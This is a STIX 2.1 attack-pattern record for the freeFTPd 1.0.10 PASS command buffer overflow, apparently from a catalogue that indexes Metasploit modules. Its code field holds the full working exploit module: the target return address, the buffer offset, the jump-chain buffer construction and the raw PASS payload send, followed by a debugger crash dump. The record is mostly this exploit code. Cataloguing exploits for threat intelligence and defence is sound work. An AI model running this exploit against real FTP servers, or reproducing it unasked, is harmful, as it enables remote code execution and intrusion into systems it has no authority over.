{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76948e73-7982-4833-90b7-20254e2e1b50",
    "created": "2024-08-14T16:50:50.472544Z",
    "modified": "2024-08-14T16:50:50.472548Z",
    "name": "\"freeFTPd PASS Command Buffer Overflow\"",
    "description": " freeFTPd 1.0.10 and below contains an overflow condition that is triggered as user-supplied input is not properly validated when handling a specially crafted PASS command. This may allow a remote attacker to cause a buffer overflow resulting in a denial of service or allow the execution of arbitrary code.  freeFTPd must have an account set to authorization anonymous user account.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/freeftpd_pass.rb",
            "external_id": "freeftpd_pass.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"freeFTPd PASS Command Buffer Overflow\",\n      'Description'    => %q{\n        freeFTPd 1.0.10 and below contains an overflow condition that is triggered as\n        user-supplied input is not properly validated when handling a specially crafted\n        PASS command. This may allow a remote attacker to cause a buffer overflow,\n        resulting in a denial of service or allow the execution of arbitrary code.\n\n        freeFTPd must have an account set to authorization anonymous user account.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Wireghoul', # Initial discovery, PoC\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '96517'],\n          ['EDB',   '27747'],\n          ['BID',   '61905']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x0a\\x0d\",\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['freeFTPd 1.0.10 and below on Windows Desktop Version',\n            {\n              'Ret'    => 0x004014bb, # pop edi # pop esi # ret 0x04 [FreeFTPDService.exe]\n              'Offset' => 801,\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-08-20',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptString.new('FTPUSER', [ true, 'The username to authenticate with', 'anonymous' ], fallbacks: ['USERNAME']),\n\n    ])\n\n    # We're triggering the bug via the PASS command, no point to have pass as configurable\n    # option.\n    deregister_options('FTPPASS')\n\n  end\n\n  def check\n\n    connect\n    disconnect\n\n    # All versions including and above version 1.0 report \"220 Hello, I'm freeFTPd 1.0\"\n    # when banner grabbing.\n    if banner =~ /freeFTPd 1\\.0/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n\n    end\n  end\n\n  def exploit\n\n    connect\n    print_status(\"Trying target #{target.name} with user #{user()}...\")\n\n    off = target['Offset'] - 9\n\n    bof = payload.encoded\n    bof << rand_text(off - payload.encoded.length)\n    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + off.to_s).encode_string\n    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-5\").encode_string\n    bof << rand_text(2)\n    bof << [target.ret].pack('V')\n\n    send_user(datastore['FTPUSER'])\n    raw_send(\"PASS #{bof}\\r\\n\")\n    disconnect\n\n  end\nend\n\n=begin\n(c78.ea4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0012b324 ebx=01805f28 ecx=00000019 edx=00000057 esi=4141413d edi=00181e18\neip=76c23e8d esp=0012b310 ebp=0012b328 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nOLEAUT32!SysFreeString+0x55:\n76c23e8d ff36            push    dword ptr [esi]      ds:0023:4141413d=????????\n\nFAULTING_IP:\nOLEAUT32!SysFreeString+55\n76c23e8d ff36            push    dword ptr [esi]\n\nEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 76c23e8d (OLEAUT32!SysFreeString+0x00000055)\n   ExceptionCode: c0000005 (Access violation)\n  ExceptionFlags: 00000000\nNumberParameters: 2\n   Parameter[0]: 00000000\n   Parameter[1]: 4141413d\nAttempt to read from address 4141413d\n=end\n",
    "x_mitre_disclosure_date": "2013-08-20",
    "x_mitre_platforms": [
        "win'"
    ]
}